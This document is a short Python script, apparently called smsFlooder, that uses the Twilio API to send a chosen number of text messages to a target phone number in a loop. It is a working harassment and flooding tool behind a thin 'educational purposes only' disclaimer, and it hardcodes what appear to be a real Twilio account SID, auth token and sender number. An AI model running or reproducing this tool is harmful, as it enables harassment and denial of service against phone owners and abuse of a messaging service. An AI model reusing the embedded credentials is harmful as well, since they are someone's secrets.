# Imports ----------------------------------------------------------------------
from twilio.rest import Client #                                               -
# ------------------------------------------------------------------------------

# Varriables -------------------------------------------------------------------
i = 0 #                                                                        -
# ------------------------------------------------------------------------------



# Twilio Setup -----------------------------------------------------------------
account_sid = "ACd1360c1183ae998dc89dba316e1eb923" # Your Account SID          -
auth_token = "6d854c08a50bc51f4da4bae03f1b0322" # Your Auth Token              -
attack_ph = "+17072384898" # Your Twilio Phone Number                          -
# ------------------------------------------------------------------------------


print("                           ________                __         ")
print("   _________ ___  _____   / ____/ /___  ____  ____/ /__  _____")
print("  / ___/ __ `__ \/ ___/  / /_  / / __ \/ __ \/ __  / _ \/ ___/")
print(" (__  ) / / / / (__  )  / __/ / / /_/ / /_/ / /_/ /  __/ /    ")
print("/____/_/ /_/ /_/____/  /_/   /_/\____/\____/\__,_/\___/_/     ")
print(" by Eclipse \n")

print("FOR EDUCATIONAL PURPOSES ONLY, YOU ARE RESPONSIBLE FOR WHAT YOU DO WITH THIS PROGRAM AND WHO YOU USE IT ON\n")
agrement = input("Do you agree? (Y/N) > ")
if agrement == "n":
    print(" You may not use this software if you do not assume the responsibilitiy \n See you later script kiddies ;)")
if agrement == "y":
    print(" Please ensure your Twilio Account Sid, Auth Token, and Phone Number are set in the smsFlood.py file \n")
    print(" !!IMPORTANT!! - Make sure your twilio phone number has the '+1' extention, or your applicable country code. \n")

    # User Input
    target_ph = input(" Enter phone to flood eg.+1xxxxxxxxxx > ")
    flood_amount = int(input(" SMS Flood amount? > "))
    flood_message = input (" Message to send? > ")
    confirmation = input('Are you sure you want to flood ' + str(flood_amount) + ' times? (Y/N) >')

    if confirmation == "n":
        print(" Okay, please run smsFlooder again to start over :) ")
        quit()


    if confirmation == "y":
        # SMS Send Prep
        client = Client(account_sid, auth_token)

        # SMS Sending
        while i < flood_amount:
            sms = client.messages.create(

                     from_ = attack_ph,
                     body = flood_message,
                     to = target_ph
                 )
            i += 1
            print('Sent message ' + str(i) + ' of ' + str(flood_amount))
            if i == flood_amount+1:
                print('Sucessfuly flooded ' + str(target_ph) + ' ' + str(flood_amount) + ' times!')
        quit()
